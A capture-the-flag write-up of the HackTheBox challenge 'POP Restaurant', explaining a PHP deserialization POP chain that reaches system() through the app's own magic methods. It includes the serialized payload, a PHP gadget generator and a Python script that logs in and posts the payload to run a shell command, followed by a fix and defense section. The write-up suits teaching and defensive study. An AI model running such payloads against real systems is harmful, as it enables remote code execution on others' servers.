---
title: "POP Restaurant"
date: 2027-04-17 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, php, deserialization, object-injection, pop-chain, rce, cwe-502]
description: "An Easy Web challenge that hands you the PHP source: an order endpoint runs unserialize() on attacker bytes. No third-party gadget is loaded — but the app's own four classes chain together through __destruct, __get, __invoke and an overridden ArrayIterator::current straight into call_user_func('system', ...). The real wrinkle is serializing an ArrayIterator subclass correctly."
---

## Overview

POP Restaurant is an Easy HackTheBox **Web** challenge. It is a tiny PHP 7.4 food-ordering
app, and you get the full source. The order endpoint deserializes a user-supplied blob with
[`unserialize()`](https://cwe.mitre.org/data/definitions/502.html), and although no library
"gadget" (Guzzle, Monolog, …) is loaded, the application's own classes form a complete
**Property-Oriented Programming (POP)** chain that ends in remote code execution. The whole
path is: untrusted `unserialize()` → a four-link magic-method chain → `system("cat /*_flag.txt")`.

## The technique

[PHP object injection](https://cwe.mitre.org/data/definitions/502.html) is not about one
dangerous class — it is about controlling the **object graph** that `unserialize()` rebuilds.
The dangerous primitive emerges from how independent magic methods compose during object
construction and teardown.

The sink lives in `order.php`, which deserializes whatever you send (the legitimate page even
base64-encodes `serialize(new Pizza())` into a hidden form field — a strong hint the server
will happily rebuild *any* object you hand it):

```php
$order = unserialize(base64_decode($_POST['data']));   // attacker controls the object graph
$foodName = get_class($order);
$db->Order($id, $foodName);
```

Four classes expose magic methods that look harmless in isolation:

```php
class Pizza      { public $size;  function __destruct(){ echo $this->size->what; } }      // undefined-prop read
class Spaghetti  { public $sauce; function __get($k){ ($this->sauce)(); } }               // property called as a function
class IceCream   { public $flavors; function __invoke(){ foreach($this->flavors as $f) echo $f; } }
namespace Helpers;
class ArrayHelpers extends \ArrayIterator {              // overrides current() during iteration
    public $callback;
    public function current(){ $v = parent::current(); call_user_func($this->callback, $v); return $v; }
}
```

Chaining them, each link pivots on a different magic method:

```
unserialize() returns a Pizza
  Pizza::__destruct      echo $this->size->what          size = Spaghetti, ->what is undefined
   └─ Spaghetti::__get   ($this->sauce)()                 sauce = IceCream (invoked as a function)
       └─ IceCream::__invoke  foreach($this->flavors ..)  flavors = ArrayHelpers(["cat /*_flag.txt"])
           └─ ArrayHelpers::current  call_user_func($this->callback, $value)
               => call_user_func("system", "cat /*_flag.txt")   ← RCE
```

The pivot that makes it click is the **undefined-property read** inside `__destruct`
(`$this->size->what`): reading a property that doesn't exist on `$this->size` triggers that
object's `__get`, which is how a destructor reaches the next gadget.

## The one real wrinkle — serializing an ArrayIterator subclass

`ArrayHelpers extends ArrayIterator`, so it does **not** serialize like a plain object. My
first attempt hand-rolled the legacy `Serializable` `C:` format
(`x:i:0;<array>m:<props>`) — the iterator's storage restored (the command string echoed back),
but the public `callback` property silently stayed `null`, so `system` never fired. A clean
diagnostic: set the callback to `var_dump` with a known value; if it isn't dumped, the property
didn't restore.

The actual native format on **both PHP 7.4 and 8.x** is the `O:` form with numeric members:

```
O:20:"Helpers\ArrayHelpers":4:{ i:0;i:0; i:1;a:1:{i:0;s:15:"cat /*_flag.txt";} i:2;a:1:{s:8:"callback";s:6:"system";} i:3;N; }
```

`i:0` = flags, `i:1` = the iterator's storage array, `i:2` = the object's properties (where
`callback` lives), `i:3` = position. The safest way to get it right is to let a real PHP build
it. The flag is renamed to `/<random>_flag.txt` at container build time, so the command uses a
shell glob.

## Solution

Build the gadget with the matching PHP version so the `ArrayIterator` serialization is correct:

Create `gen.php`:

```php
<?php
namespace Helpers { class ArrayHelpers extends \ArrayIterator { public $callback; } }
namespace {
    class Pizza { public $size; }
    class Spaghetti { public $sauce; }
    class IceCream { public $flavors; }
    $arr = new \Helpers\ArrayHelpers([$argv[1] ?? 'cat /*_flag.txt']);
    $arr->callback = 'system';
    $ice = new IceCream();   $ice->flavors = $arr;
    $spag = new Spaghetti(); $spag->sauce  = $ice;
    $pizza = new Pizza();    $pizza->size  = $spag;
    echo base64_encode(serialize($pizza));
}
```

```bash
docker run --rm -v "$PWD":/w -w /w php:7.4-cli php gen.php 'cat /*_flag.txt'
```

Then register, log in (the endpoint requires an authenticated session) and POST the blob. A
self-contained driver:

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys, base64, re, os, requests
BASE = sys.argv[1]; CMD = sys.argv[2] if len(sys.argv) > 2 else "cat /*_flag.txt"
def s(x):
    b = x.encode(); return f's:{len(b)}:"{x}";'
ah = (f'O:20:"Helpers\\ArrayHelpers":4:{{'
      f'i:0;i:0;'
      f'i:1;a:1:{{i:0;{s(CMD)}}}'
      f'i:2;a:1:{{{s("callback")}{s("system")}}}'
      f'i:3;N;}}')
ic = f'O:8:"IceCream":1:{{s:7:"flavors";{ah}}}'
sp = f'O:9:"Spaghetti":1:{{s:5:"sauce";{ic}}}'
pz = f'O:5:"Pizza":1:{{s:4:"size";{sp}}}'
payload = base64.b64encode(pz.encode()).decode()
sess = requests.Session(); user = "poc_" + os.urandom(4).hex(); pw = "Passw0rd!"
sess.post(f"{BASE}/register.php", data={"username": user, "password": pw}, allow_redirects=False)
sess.post(f"{BASE}/login.php",    data={"username": user, "password": pw}, allow_redirects=False)
r = sess.post(f"{BASE}/order.php", data={"data": payload}, allow_redirects=False)
m = re.search(r'HTB\{[^}]+\}', r.text)
print(m.group(0) if m else r.text)
```

```bash
python3 solve.py http://<target-host>:<port> 'cat /*_flag.txt'
```

`system()` writes its output to the response body **before** `IceCream::__invoke` echoes the
command string, so the flag comes out inline even though `order.php` returns a `302` redirect —
the body reads `HTB{...}cat /*_flag.txt`.

```
HTB{...}
```

## Why it worked

Untrusted input reaches `unserialize()` with no integrity check and no class allow-list, so the
attacker controls the entire reconstructed object graph and which magic methods run during
construction and teardown. The codebase happened to contain a complete gadget set — a method
that calls a user-supplied callable on a user-supplied value — so no third-party library gadget
was even necessary.

## Fix / defense

- **Never `unserialize()` attacker-controlled data.** Use `json_decode()` with a strict schema.
- If PHP serialization is unavoidable, restrict the classes that can be instantiated:

```php
$order = unserialize(base64_decode($_POST['data']), ['allowed_classes' => false]);
```

- Sign serialized blobs with an HMAC and verify before deserializing.
- Keep magic methods (`__destruct`, `__wakeup`, `__get`, `__invoke`) free of side effects on
  untrusted state, and never route an object property into `call_user_func`/dynamic invocation.
